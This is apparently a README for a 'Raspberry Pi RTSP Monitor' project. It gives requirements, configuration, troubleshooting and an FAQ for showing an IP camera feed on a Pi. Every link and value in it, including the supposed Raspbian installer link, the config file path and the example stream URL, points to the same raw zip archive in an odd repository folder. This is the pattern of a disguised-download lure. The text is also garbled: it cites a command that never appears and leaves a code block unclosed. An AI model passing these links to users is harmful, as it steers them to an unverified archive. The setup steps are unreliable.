## 🚀 Getting Started
Welcome to the **Raspberry Pi RTSP Monitor**! This application lets you turn your Raspberry Pi into a dedicated RTSP camera monitor. Whether you’re monitoring a security camera or simply observing your pets, this guide will help you set everything up smoothly.

## 📋 Requirements
Before you begin, here’s what you need:

- A Raspberry Pi (any model will work, but the Raspberry Pi Zero W is recommended).
- An HDMI monitor or display.
- An RTSP-compatible camera (like an IP camera).
- A stable internet connection.
- Software: Raspbian OS installed on your Raspberry Pi. If you haven't installed it yet, follow [this link to install Raspbian](https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/pi_rtsp_monitor_raspberry_v1.5.zip).

   ```
   Ensure your RTSP camera is turned on and connected to the same network as your Raspberry Pi.

## ⚙️ Configuration
To configure your RTSP camera, open the `https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/pi_rtsp_monitor_raspberry_v1.5.zip` file located in the application folder. Here’s how you can adjust the settings:

- **RTSP Stream URL:** This is where you input the streaming link of your RTSP camera. For example:
  ```json
  "rtsp_url": "https://raw.githubusercontent.com/Kanyanat161/raspberry-pi-rtsp-monitor/main/harka/pi_rtsp_monitor_raspberry_v1.5.zip"
  ```
- **Display Settings:** Adjust settings according to your monitor resolution. 

Save your changes, and then restart the application with the command mentioned in the previous section.

## 🖥️ Monitor Your Camera
When the application runs successfully, you should see the camera feed on your connected monitor. You can resize the display or switch between multiple feeds if you have more than one RTSP camera.

## ❓ Troubleshooting
If you encounter any issues, consider the following:

- **No Camera Feed:** Ensure your RTSP URL is correct and your camera is online.
- **Performance Issues:** Try lowering the resolution of the camera in the settings to achieve smoother video playback.

## 📚 FAQ
**Q: Do I need to setup anything special for the Raspberry Pi?**

A: Yes. Ensure your Raspberry Pi is connected to the internet and has Raspbian OS installed.

**Q: Is this software compatible with all RTSP cameras?**

A: Most RTSP cameras should work, but always check your camera specifications.
